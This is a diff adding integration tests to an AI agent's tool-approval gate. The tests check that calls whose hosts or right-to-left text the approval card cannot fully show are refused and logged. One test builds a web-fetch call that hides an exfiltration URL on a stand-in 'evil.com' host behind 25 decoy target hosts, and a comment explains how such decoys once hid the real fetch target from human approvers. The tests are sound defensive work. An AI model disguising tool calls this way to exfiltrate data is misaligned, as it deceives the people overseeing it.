@@ -556,6 +556,50 @@ describe("approval routes (integration, real DB)", () => {
     });
   });
 
+  // The prompt is what every approval surface shows, and "allow" there runs
+  // the tool. Naming the hosts that fit and eliding the rest left out the last
+  // one — and decoys under `target`, `destination` and `targets` ahead of a
+  // fetch's `url` made that the host it fetched. A call whose hosts the prompt
+  // cannot all name gets no confirmation at all.
+  describe("a call whose hosts the prompt cannot all name", () => {
+    const params = () => ({
+      targets: Array.from({ length: 25 }, (_, i) => `https://s${i}.firma.at/`),
+      url: "https://evil.com/exfil?d=secret",
+    });
+
+    it("is refused before anything is opened, with a reason that tells the agent to split it", async () => {
+      agent = await seedAgent(user.id, ["pinchy_web_fetch"]);
+      const res = await (
+        await gateCheck(gateReq(gateBody({ toolName: "pinchy_web_fetch", params: params() })))
+      ).json();
+      expect(res.decision).toBe("block");
+      expect(res.approval).toBeUndefined();
+      expect(res.requestId).toBeUndefined();
+      expect(res.reason).toMatch(/26 different hosts/);
+      expect(res.reason).toMatch(/split it into smaller calls/i);
+      expect(await db.select().from(toolApproval)).toHaveLength(0);
+    });
+
+    it("records the refusal in the audit trail, without the hosts", async () => {
+      agent = await seedAgent(user.id, ["pinchy_web_fetch"]);
+      await gateCheck(gateReq(gateBody({ toolName: "pinchy_web_fetch", params: params() })));
+      const refused = await db
+        .select()
+        .from(auditLog)
+        .where(eq(auditLog.eventType, "approval.refused"));
+      expect(refused).toHaveLength(1);
+      expect(refused[0].outcome).toBe("failure");
+      expect(refused[0].detail).toMatchObject({
+        toolName: "pinchy_web_fetch",
+        argsDigest: computeArgsDigest(params()),
+        reason: "too-large-to-show",
+        exceeded: "too-many-hosts",
+      });
+      expect(JSON.stringify(refused[0].detail)).not.toContain("evil.com");
+      expect(JSON.stringify(refused[0].detail)).not.toContain("firma.at");
+    });
+  });
+
   // A summary that said "1 more field not shown" was still approvable, and the
   // hidden field still ran. A call the card cannot show in full is refused at the
   // gate — nothing is opened, nothing can be approved, and the model is told to
@@ -660,6 +704,27 @@ describe("approval routes (integration, real DB)", () => {
         .from(auditLog)
         .where(eq(auditLog.eventType, "approval.refused"));
       expect(refused.detail).toMatchObject({ exceeded: "text-too-long" });
+    });
+
+    // Every right-to-left word the card isolates costs the approver's browser
+    // layout time; sixty long targets of alternating Hebrew and digits took
+    // about a second to draw.
+    it("is refused when the card would draw too many right-to-left words", async () => {
+      agent = await seedAgent(user.id, ["pinchy_write"]);
+      const target = Array.from({ length: 4_096 }, (_, i) => (i % 2 ? "1" : "א")).join("");
+      const params = { path: "/data/out/a.md", content: "x", targets: Array(60).fill(target) };
+      const res = await (
+        await gateCheck(gateReq(gateBody({ toolName: "pinchy_write", params })))
+      ).json();
+      expect(res.decision).toBe("block");
+      expect(res.approval).toBeUndefined();
+      expect(res.reason).toMatch(/right-to-left words/);
+      expect(await db.select().from(toolApproval)).toHaveLength(0);
+      const [refused] = await db
+        .select()
+        .from(auditLog)
+        .where(eq(auditLog.eventType, "approval.refused"));
+      expect(refused.detail).toMatchObject({ exceeded: "too-many-rtl-words" });
     });
 
     it("still opens a full card for an Odoo write with 26 fields, the bank account last", async () => {
